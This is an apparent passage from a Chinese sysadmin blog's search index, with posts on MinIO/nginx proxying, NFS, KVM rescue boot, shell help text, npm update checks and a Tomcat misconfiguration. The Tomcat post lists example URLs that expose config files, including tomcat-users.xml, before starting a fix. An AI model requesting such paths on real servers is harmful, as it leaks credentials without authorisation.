src=\"/posts/20231228-minio_nginx/image-20231228140755759.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后我们上传个图片，BOMS3.0.png，然后去/app/bucket目录下看看\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20231228141032738\" loading=\"lazy\" src=\"/posts/20231228-minio_nginx/image-20231228141032738.png\"\u003e\u003c/p\u003e\n\u003cp\u003e结果发现BOMS3.0.png居然是个目录，进去继续看\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20231228141121489\" loading=\"lazy\" src=\"/posts/20231228-minio_nginx/image-20231228141121489.png\"\u003e\u003c/p\u003e\n\u003cp\u003emeta信息和若干的part，看来这是为多版本准备的，这就是为什么要策略是public的原因，不是就无法从9000访问。\u003c/p\u003e\n\u003cp\u003e二、安装配置nginx\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen      80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen      \u003cspan class=\"o\"\u003e[\u003c/span\u003e::\u003cspan class=\"o\"\u003e]\u003c/span\u003e:80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server_name  supervisor-task.ddky.com\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    location / \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"m\"\u003e301\u003c/span\u003e https://supervisor-task.ddky.com\u003cspan class=\"nv\"\u003e$request_uri\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen       \u003cspan class=\"m\"\u003e443\u003c/span\u003e ssl\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server_name  supervisor_task.ddky.com\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_certificate      /etc/nginx/cert/_.ddky.com.crt\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_certificate_key  /etc/nginx/cert/_.ddky.com.key\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_session_timeout 5m\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    location / \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        rewrite ^/$ /pub/index.html break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_pass http://10.10.247.211:9000/pub/\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_redirect off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    access_log     /app/logs/access.log \u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    error_log      /app/logs/error.log\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e主要就是要配置代理，代理到minio的9000端口\u003c/p\u003e","title":"配置Minio+nginx的代理来开放桶内内容"},{"content":"NFS的SERVER分两部分： 1、RPC 主程序：rpcbind NFS 本质是一个 RPC 服务，而要启动任何一个 RPC 服务之前，都需要做好 port 的对应 (mapping) 的工作才行，这个工作其实就是『 rpcbind 』这个服务所负责的！也就是说， 在启动任何一个 RPC 服务之前，我们都需要启动 rpcbind 才行！ (在 CentOS 5.x 以前这个软件称为 portmap，在 CentOS 6.x 之后才称为 rpcbind 的！)\n2、NFS 主程序：nfs-utils 就是提供 rpc.nfsd 及 rpc.mountd 这两个 NFS daemons 与其他相关 documents 与说明文件、执行文件等的软件！这个就是 NFS 服务所需要的主要软件！\n安装服务端NFS Server yum install nfs-utils rpcbind -y sudo apt install nfs-kernel-server 客户端不提供服务，所以不用装rpcbind yum install nfs-utils sudo apt install nfs-common 将NFS和rpcbind加入开机启动 systemctl enable --now rpcbind systemctl enable --now nfs 客户端不用启用任何服务 服务端检查是否安装nfs： rpm -qa | grep nfs与 rpm -qa | grep rpcbind即可 停止服务端的nfs server的方法： systemctl stop nfs systemctl stop rpcbind 配置共享目录 在服务端配置一个共享目录\n$ mkdir /data $ chmod 755 /data 根据这个目录，相应配置导出目录\n$ vi /etc/exports 添加如下配置 /data/ 192.168.0.0/24(rw,sync,no_root_squash,no_all_squash)\n/data: 共享目录位置。 192.168.0.0/24: 客户端 IP 范围，* 代表所有，即没有限制。 rw: 权限设置，可读可写。 sync: 同步共享目录。 no_root_squash: 可以使用 root 授权。 no_all_squash: 可以使用普通用户授权。 在客户端上查询server： showmount -e 10.0.6.10 mount -t nfs 192.168.0.1:/data /mnt/nfs 取消挂载 umount /app/file fuser /app/file umount -d -l /app/file fuser -m -v -i -k /app/file ","permalink":"https://rendoumi.com/posts/20231228-nfs_detail/","summary":"\u003ch2 id=\"nfs的server分两部分\"\u003eNFS的SERVER分两部分：\u003c/h2\u003e\n\u003ch3 id=\"1rpc-主程序rpcbind\"\u003e1、RPC 主程序：rpcbind\u003c/h3\u003e\n\u003cp\u003eNFS 本质是一个 RPC 服务，而要启动任何一个 RPC 服务之前，都需要做好 port 的对应 (mapping) 的工作才行，这个工作其实就是『 rpcbind 』这个服务所负责的！也就是说， 在启动任何一个 RPC 服务之前，我们都需要启动 rpcbind 才行！ (在 CentOS 5.x 以前这个软件称为 portmap，在 CentOS 6.x 之后才称为 rpcbind 的！)\u003c/p\u003e\n\u003ch3 id=\"2nfs-主程序nfs-utils\"\u003e2、NFS 主程序：nfs-utils\u003c/h3\u003e\n\u003cp\u003e就是提供 rpc.nfsd 及 rpc.mountd 这两个 NFS daemons 与其他相关 documents 与说明文件、执行文件等的软件！这个就是 NFS 服务所需要的主要软件！\u003c/p\u003e\n\u003ch2 id=\"安装服务端nfs-server\"\u003e安装服务端NFS Server\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install nfs-utils rpcbind  -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install nfs-kernel-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"客户端不提供服务所以不用装rpcbind\"\u003e客户端不提供服务，所以不用装rpcbind\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install nfs-utils\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install nfs-common\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"将nfs和rpcbind加入开机启动\"\u003e将NFS和rpcbind加入开机启动\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now nfs\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"客户端不用启用任何服务\"\u003e客户端不用启用任何服务\u003c/h2\u003e\n\u003ch2 id=\"服务端检查是否安装nfs\"\u003e服务端检查是否安装nfs：\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -qa \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep nfs与 rpm -qa \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep rpcbind即可\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"停止服务端的nfs-server的方法\"\u003e停止服务端的nfs server的方法：\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl stop nfs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl stop rpcbind\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"配置共享目录\"\u003e配置共享目录\u003c/h2\u003e\n\u003cp\u003e在服务端配置一个共享目录\u003c/p\u003e","title":"NFS的详细解释"},{"content":"Kvm虚拟机挂载临时急救iso启动的方法： 首先去到宿主机\n编辑虚机文件virsh edit vis-18-32-6\n\u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; \u0026lt;target dev=\u0026#39;hda\u0026#39; bus=\u0026#39;ide\u0026#39;/\u0026gt; \u0026lt;readonly/\u0026gt; \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;0\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; \u0026lt;/disk\u0026gt; 在target下面增加一行source：\n\u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; \u0026lt;target dev=\u0026#39;hda\u0026#39; bus=\u0026#39;ide\u0026#39;/\u0026gt; \u0026lt;source file=\u0026#34;/export/kvm/systemrescuecd-x86-5.2.2.iso\u0026#34;/\u0026gt; \u0026lt;readonly/\u0026gt; \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;0\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; \u0026lt;/disk\u0026gt; 再修改boot为cdrom，改回去则是hd\n\u0026lt;os\u0026gt; \u0026lt;type arch=\u0026#39;x86_64\u0026#39; machine=\u0026#39;pc-i440fx-rhel7.0.0\u0026#39;\u0026gt;hvm\u0026lt;/type\u0026gt; \u0026lt;boot dev=\u0026#39;cdrom\u0026#39;/\u0026gt; \u0026lt;/os\u0026gt; 然后启动虚机就可以了。\n","permalink":"https://rendoumi.com/posts/20231228-kvm_isoboot/","summary":"\u003ch4 id=\"kvm虚拟机挂载临时急救iso启动的方法\"\u003eKvm虚拟机挂载临时急救iso启动的方法：\u003c/h4\u003e\n\u003cp\u003e首先去到宿主机\u003c/p\u003e\n\u003cp\u003e编辑虚机文件virsh edit vis-18-32-6\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;disk \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003edevice\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;driver \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;qemu\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;raw\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;target \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hda\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ide\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;readonly/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;address \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;drive\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003econtroller\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/disk\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在target下面增加一行source：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;disk \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003edevice\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;driver \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;qemu\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;raw\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;target \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hda\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ide\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t  \u0026lt;\u003cspan class=\"nb\"\u003esource\u003c/span\u003e \u003cspan class=\"nv\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/export/kvm/systemrescuecd-x86-5.2.2.iso\u0026#34;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;readonly/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;address \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;drive\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003econtroller\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/disk\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e再修改boot为cdrom，改回去则是hd\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;os\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;\u003cspan class=\"nb\"\u003etype\u003c/span\u003e \u003cspan class=\"nv\"\u003earch\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;x86_64\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003emachine\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;pc-i440fx-rhel7.0.0\u0026#39;\u003c/span\u003e\u0026gt;hvm\u0026lt;/type\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;boot \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;/os\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后启动虚机就可以了。\u003c/p\u003e","title":"Kvm虚拟机挂载临时急救iso启动的方法"},{"content":"Shell脚本好的帮助信息的例子 一个好的脚本，必须有好的帮助信息\n给一个比较简洁的例子\n#!/bin/bash\r###\r### my-script — does one thing well\r###\r### Usage:\r### my-script \u0026lt;input\u0026gt; \u0026lt;output\u0026gt;\r###\r### Options:\r### \u0026lt;input\u0026gt; Input file to read.\r### \u0026lt;output\u0026gt; Output file to write. Use '-' for stdout.\r### -h Show this message.\rhelp() {\rawk -F'### ' '/^###/ { print $2 }' \u0026quot;$0\u0026quot;\r}\rif [[ $# == 0 ]] || [[ \u0026quot;$1\u0026quot; == \u0026quot;-h\u0026quot; ]]; then\rhelp\rexit 1\rfi\recho Hello World\r以前丑陋的用法真是没法看！！！\n","permalink":"https://rendoumi.com/posts/20231228-shell_prompt/","summary":"\u003ch4 id=\"shell脚本好的帮助信息的例子\"\u003eShell脚本好的帮助信息的例子\u003c/h4\u003e\n\u003cp\u003e一个好的脚本，必须有好的帮助信息\u003c/p\u003e\n\u003cp\u003e给一个比较简洁的例子\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#!/bin/bash\r\n###\r\n### my-script — does one thing well\r\n###\r\n### Usage:\r\n###   my-script \u0026lt;input\u0026gt; \u0026lt;output\u0026gt;\r\n###\r\n### Options:\r\n###   \u0026lt;input\u0026gt;   Input file to read.\r\n###   \u0026lt;output\u0026gt;  Output file to write. Use '-' for stdout.\r\n###   -h        Show this message.\r\n\r\nhelp() {\r\n    awk -F'### ' '/^###/ { print $2 }' \u0026quot;$0\u0026quot;\r\n}\r\n\r\nif [[ $# == 0 ]] || [[ \u0026quot;$1\u0026quot; == \u0026quot;-h\u0026quot; ]]; then\r\n    help\r\n    exit 1\r\nfi\r\n\r\necho Hello World\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e以前丑陋的用法真是没法看！！！\u003c/p\u003e","title":"shell脚本的一个好的帮助信息"},{"content":"Nodejs禁止后台偷偷升级 去到172.18.31.2上，会看到很多node进程\n有病噻，系统都没有运行node程序。唯一的程序是nci-ansible-ui-quick-setup，在/export/server下，还没有运行，升级个茄子噻。\n全杀掉，然后全局禁止升级即可\nnpm config set update-notifier false --global 第一次运行会有个提示，再运行就没有了。 ","permalink":"https://rendoumi.com/posts/20231228-nodejs_noupgrade/","summary":"\u003ch4 id=\"nodejs禁止后台偷偷升级\"\u003eNodejs禁止后台偷偷升级\u003c/h4\u003e\n\u003cp\u003e去到172.18.31.2上，会看到很多node进程\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231228-nodejs_noupgrade/2021-05-02_225810.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有病噻，系统都没有运行node程序。唯一的程序是nci-ansible-ui-quick-setup，在/export/server下，还没有运行，升级个茄子噻。\u003c/p\u003e\n\u003cp\u003e全杀掉，然后全局禁止升级即可\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enpm config set update-notifier false --global\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e第一次运行会有个提示，再运行就没有了。\n\u003cimg loading=\"lazy\" src=\"/posts/20231228-nodejs_noupgrade/2021-05-02_230050.png\"\u003e\u003c/p\u003e","title":"Nodejs禁止后台偷偷升级"},{"content":"Tomcat配置不当导致文件泄露 说明：Tomcat由于配置不当会导致tomcat/conf log webapps work temp bin lib等信息暴露在游览器中 例如：\nhttp://192.168.89.38:8080/conf/catalina.policy http://192.168.89.38:8080/conf/catalina.properties http://192.168.89.38:8080/conf/context.xml http://192.168.89.38:8080/conf/logging.properties http://192.168.89.38:8080/conf/server.xml http://192.168.89.38:8080/conf/tomcat-users.xml http://192.168.89.38:8080/conf/web.xml 修复方法：\n将 /export/servers/tomcat 下的 server.xml \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;\u0026#34; 改成 \u0026lt;Host name=\u0026#34;localhost\u0026#34; appBase=\u0026#34;webapps\u0026#34; appBase千万不能为空 修改完后重启生效\n","permalink":"https://rendoumi.com/posts/20231228-tomcat_config/","summary":"\u003ch4 id=\"tomcat配置不当导致文件泄露\"\u003eTomcat配置不当导致文件泄露\u003c/h4\u003e\n\u003cp\u003e说明：Tomcat由于配置不当会导致tomcat/conf log webapps work temp bin lib等信息暴露在游览器中\n例如：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/catalina.policy\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/catalina.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/context.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/logging.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/server.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/tomcat-users.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://192.168.89.38:8080/conf/web.xml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e修复方法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e将 /export/servers/tomcat 下的 server.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 